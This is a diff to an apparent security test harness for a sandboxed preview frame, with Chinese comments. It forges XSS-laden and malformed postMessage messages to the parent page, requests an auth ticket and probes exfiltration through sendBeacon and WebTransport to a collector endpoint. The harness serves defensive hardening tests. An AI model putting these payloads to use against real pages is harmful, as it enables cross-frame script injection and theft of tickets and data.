@@ -384,6 +384,8 @@ export async function insertAttacks(ctx) {
 
 /* ------------------------------------------------------------------ 伪造:向父页发各种消息 */
 export function forgedMessages(ctx) {
+  // 超范围的数现拼出来:这份源码(连同转译结果)会进编辑页面的转译缓存,字面量写在这里的话探针在父页存储里找这个数时会找到源码本身
+  const HUGE = Number("7.77e" + "98");
   const M = ctx.magic, big = "x".repeat(1024 * 1024);
   const xss = "<img src=x onerror=\"parent.__pcXss=1;window.__pcXss=1\"><script>window.__pcXss=1</" + "script><div data-pcevil-html=\"" + ctx.tag + "\">" + M + "</div>";
   const list = [
@@ -398,12 +400,12 @@ export function forgedMessages(ctx) {
     { type: "pc-rpc-reply", id: 2, ok: false, error: big },
     { type: "frame", sec: 1e99 }, { type: "frame", sec: -5 }, { type: "frame", sec: "1" }, { type: "ended", sec: NaN },
     { type: "settled", sec: 1, clipIds: new Array(100000).fill(M) },
-    { type: "probe", identityKey: "FORGED-" + M, fps: 30, stepMs: 7.77e98, inlineMs: -7.77e98, rasterMs: 7.77e98, serializeMs: 7.77e98, catchUpMs: 7.77e98, kind: "stepped", seekMs: 7.77e98 },
+    { type: "probe", identityKey: "FORGED-" + M, fps: 30, stepMs: HUGE, inlineMs: -HUGE, rasterMs: HUGE, serializeMs: HUGE, catchUpMs: HUGE, kind: "stepped", seekMs: HUGE },
     { type: "probe", identityKey: "FORGED-" + M, fps: 1e9, stepMs: Infinity, inlineMs: NaN, rasterMs: "1", serializeMs: null, catchUpMs: {}, kind: "evil" },
     { type: "demote", clipId: big }, { type: "demote", clipId: { toString: 1 } },
     { type: "probe-frame", clipId: "pcevil", localFrame: 0, html: xss },
     { type: "bake-frame", session: "pcevil", clipId: "pcevil", localFrame: 1e99, hash: "zz", bytes: -1, htmlRaw: new ArrayBuffer(8) },
-    { type: "bake-frame", session: M, clipId: M, localFrame: 0, hash: "0".repeat(64), bytes: 7.77e98, htmlRaw: new TextEncoder().encode(xss).buffer },
+    { type: "bake-frame", session: M, clipId: M, localFrame: 0, hash: "0".repeat(64), bytes: HUGE, htmlRaw: new TextEncoder().encode(xss).buffer },
     { type: "mediaReady", sec: { valueOf: 1 } },
     { type: "auth.ticket", kind: "asset", access: "rw" },
     { type: "pc-give-me-the-ticket", reqId: M },
@@ -455,7 +457,7 @@ export async function workerAttacks(ctx) {
   await t("w.nested-worker-url", () => new Promise((res) => { try { const w = new Worker(E + "/x.js?wworker=" + tag); w.onerror = () => res("拦下"); later(() => res("已建"), 500); } catch (e) { res("抛错:" + e.name); } }));
   await t("w.webtransport", () => { if (typeof WebTransport !== "function") return "没有这个接口"; const w = new WebTransport("https://127.0.0.1:" + ctx.collectorPort + "/wwt"); return w.ready.then(() => "到达", () => "拦下"); });
   await t("w.beacon", () => (self.navigator.sendBeacon ? String(self.navigator.sendBeacon(E + "/x?wbeacon=" + tag, "d")) : "没有这个接口"));
-  if (ctx.sid && ctx.mediaHash) await t("w.media", () => fetch(self.location.origin === "null" ? "" : ctx.stageOrigin + "/media-s/" + ctx.sid + "/media/" + ctx.mediaHash).then((r) => "状态:" + r.status + " " + text(Array.from(r.headers.entries()))));
+  if (ctx.sid && ctx.mediaHash) await t("w.media", () => fetch(self.location.origin === "null" ? "" : (ctx.stageOrigin || self.location.origin) + "/media-s/" + ctx.sid + "/media/" + ctx.mediaHash).then((r) => "状态:" + r.status + " " + text(Array.from(r.headers.entries()))));
   await t("w.pcm", () => { const a = new Float32Array(4800); for (let i = 0; i < a.length; i++) a[i] = Math.sin(i / 20); return "采样:" + a.length; });
   return out;
 }
@@ -487,10 +489,18 @@ export function navAttack(ctx) {
 export async function runAll(ctx) {
   const result = { tag: ctx.tag, at: Date.now() };
   result.parent = await parentReads(ctx);
-  const listening = listenParent(ctx);
+  // 一边听父页的消息,一边:把读得到的一切倒出来、(图卡)凭 cookie 读素材进 GPU、试着造一个子框架(加固拦下并上报,
+  // 父页改判、把取档策略重发给两台 —— 听到的消息里不该有票据)
+  const heard = [];
+  const onMessage = (e) => { try { heard.push(text(e.data).slice(0, 200000)); } catch (err) { heard.push("消息读不了"); } };
+  addEventListener("message", onMessage);
   result.dump = await dumpEverything(ctx);
-  result.heard = await listening;
   if (ctx.graph && ctx.sid && ctx.mediaHash) result.media = await mediaWork(ctx);
+  result.firstBreach = await hardenAttacks({ ...ctx, only: ["createElement"] });
+  await wait(ctx.listenAfterMs || 4000);
+  removeEventListener("message", onMessage);
+  result.heard = { "parent-messages": heard.join("\n") };
+  // 这时闸门已经因为上面那一下关上了;照样硬跑,看的是浏览器与加固拦不拦得住
   result.forged = forgedMessages(ctx);
   result.exfil = await exfilAttacks(ctx);
   result.harden = await hardenAttacks(ctx);
